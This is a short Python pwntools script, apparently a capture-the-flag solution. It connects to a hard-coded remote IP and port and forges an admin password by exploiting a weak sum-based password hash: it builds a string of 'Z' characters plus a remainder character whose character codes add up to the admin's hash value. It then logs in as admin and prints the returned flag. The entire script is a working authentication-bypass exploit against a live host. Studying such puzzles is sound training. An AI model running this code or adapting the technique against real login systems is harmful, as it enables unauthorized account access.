#!/usr/bin/env python3
from pwn import remote, context

context.log_level = 'debug'  # Enable DEBUG mode

r = remote('52.76.13.43', 8082)

# Calculate password
base_char = 'Z'
base_ord = ord(base_char)

target_hash = '32323931'  # admin's hash
target_sum = int(bytes.fromhex(target_hash).decode())

count = target_sum // base_ord
remainder = target_sum % base_ord

password = base_char * count + chr(remainder)

# Exploit interaction
r.sendlineafter(">> ", "1")
r.sendlineafter("Username: ", "admin")
r.sendlineafter("Password: ", password)
r.sendlineafter(">> ", "1")
r.recvuntil(b"flag: ")

flag = r.recvline().strip().decode()
print(f"Flag: {flag}")
